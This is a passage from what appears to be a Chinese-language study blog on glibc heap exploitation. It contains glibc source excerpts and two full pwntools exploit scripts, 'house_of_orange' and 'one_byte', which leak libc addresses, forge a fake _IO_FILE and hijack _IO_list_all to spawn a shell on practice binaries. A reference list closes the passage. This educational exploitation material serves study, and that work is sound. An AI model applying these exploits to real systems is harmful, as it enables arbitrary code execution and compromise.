    +0x0050 __seekpos            : _IO_seekpos_t
    +0x0058 __setbuf             : _IO_setbuf_t
    +0x0060 __sync               : _IO_sync_t
    +0x0068 __doallocate         : _IO_doallocate_t
    +0x0070 __read               : _IO_read_t
    +0x0078 __write              : _IO_write_t
    +0x0080 __seek               : _IO_seek_t
    +0x0088 __close              : _IO_close_t
    +0x0090 __stat               : _IO_stat_t
    +0x0098 __showmanyc          : _IO_showmanyc_t
    +0x00a0 __imbue              : _IO_imbue_t
</code></pre>
<pre><code class="c">  for (fp = (_IO_FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
       || (_IO_vtable_offset (fp) == 0
           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;
    }
</code></pre>
<pre><code class="c">          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &amp;main_arena)
        set_non_main_arena (victim);
#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
        }
#endif
            }
</code></pre>
<h4 id="示例一-house-of-orange"><a href="#示例一-house-of-orange" class="headerlink" title="示例一  house_of_orange"></a>示例一  house_of_orange</h4><blockquote>
<p>文件详见 <a href="attachment%5Chouse_of_orange%5Chouse_of_orange">house_of_orange</a></p>
</blockquote>
<h5 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;house_of_orange&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the &quot;malloc (small)&quot; option.
def small_malloc():
    io.send(b&quot;1&quot;)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;malloc (large)&quot; option.
def large_malloc():
    io.sendthen(b&quot;&gt; &quot;, b&quot;2&quot;)

# Select the &quot;edit (1st small chunk)&quot; option; send data.
def edit(data):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b&quot;heap @ &quot;)
heap = int(io.recvline(), 16)
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request a small chunk.
small_malloc()

# Edit the 1st small chunk.
edit(b&quot;Y&quot;*24+p64(0x1000 - 0x20 + 1))
large_malloc()
# edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0))
# edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))
# small_malloc()

# IO_FILE
flags = b&quot;/bin/sh\x00&quot;
size = 0x61
fd = 0
bk = libc.sym._IO_list_all - 0x10

write_base = 0x1
write_ptr = 0x2
mode =  0x0
vtable_ptr = heap + 0xd8
overflow = libc.sym.system

fake_io_file = flags + p64(size) +\
    p64(fd) + p64(bk) +\
    p64(write_base) + p64(write_ptr) +\
    p64(0)*18 + p32(mode) + p32(0) +\
    p64(0) + p64(overflow) +p64(vtable_ptr)


edit(b&quot;X&quot;*16 + fake_io_file)

small_malloc()

# =============================================================================

io.interactive()
</code></pre>
<h4 id="示例二-one-byte"><a href="#示例二-one-byte" class="headerlink" title="示例二 one_byte"></a>示例二 one_byte</h4><blockquote>
<p>文件详见 <a href="attachment%5Cone_byte%5Cone_byte">one_byte</a></p>
</blockquote>
<h5 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;one_byte&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b&quot;&gt; &quot;, b&quot;1&quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;read&quot; option; read 0x58 bytes.
def read(index):
    io.send(b&quot;4&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    r = io.recv(0x58)
    io.recvuntil(b&quot;&gt; &quot;)
    return r

io = start()
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# overlap
edit(chunk_A, b&#39;Y&#39;*88 + p8(0xc1))

# leak libc
free(chunk_B)
chunk_B = malloc()

data = read(chunk_C)
unsortedbin_address = u64(data[:8])
info(f&quot;unsortedbin_address -&gt; {hex(unsortedbin_address)}&quot;)
libc.address = unsortedbin_address - 0x58 - libc.sym.main_arena
info(f&quot;libc base -&gt; {hex(libc.address)}&quot;)

# leak heap
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

heap = u64(read(chunk_C)[:8])
info(f&quot;heap base -&gt; {hex(heap)}&quot;)

# unsortedbin
chunk_C2 = malloc()
chunk_A = malloc()
edit(chunk_A, b&quot;Y&quot;*88 + p8(0xc1))
# edit(chunk_A, b&quot;Y&quot;*88 + p8(0x68))
free(chunk_B)
chunk_B = malloc()

# unsortedbin again and IO_File
edit(chunk_B, p64(0)*10 + b&#39;/bin/sh\x00&#39; + p8(0xb1))
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 0x10) + p64(1) + p64(2))
edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))

malloc()

#  =============================================================================

io.interactive()
</code></pre>
<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><ul>
<li><p><a href="https://www.udemy.com/">Udemy</a></p>
<ul>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">Linux Heap Exploitation - Part 1</a></li>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-2/">Linux Heap Exploitation - Part 2</a></li>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-3/">Linux Heap Exploitation - Part 3</a></li>
</ul>
</li>
<li><p>source code</p>
<ul>
<li><a href="https://www.gnu.org/software/libc/">glibc code</a></li>
</ul>
</li>
<li><p><a href="www.52pojie.cn">吾爱破解</a></p>
<ul>
<li><a href="https://www.52pojie.cn/home.php?mod=space&uid=1573412&do=thread&view=me&from=space">呆毛王与咖喱棒</a></li>
<li></li>
</ul>
</li>
<li><p>self blog</p>
<ul>
<li><a href="https://hack1s.fun/">RIVER LI</a></li>
</ul>
</li>
<li><p>github blog</p>
<ul>
<li> <a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">知世-glbic内存管理学习笔记 </a></li>
</ul>
</li>
<li><p><a href="https://bbs.pediy.com/">看雪论坛</a></p>
<ul>
<li><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h2_3">Largebin attack总结</a></li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/">CSDN</a></p>
<ul>
<li><a href="https://blog.csdn.net/qq_41202237/category_10328044.html">hollk-堆溢出</a></li>
<li></li>
</ul>
</li>
<li><p><a href="https://www.cnblogs.com/">博客园</a></p>
<ul>
<li><a href="https://www.cnblogs.com/luoleqi/p/11801400.html">Pwnki-Linux堆的一些基础知识</a></li>
<li><a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">Pwnki-glibc 2.31 malloc与free 源码分析</a></li>
</ul>
</li>
<li><p>文档</p>
<ul>
<li><a href="attachment%5Creport%5Cglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">华庭师傅 - glibc内存管理ptmalloc源代码分析</a></li>
</ul>
</li>
</ul>
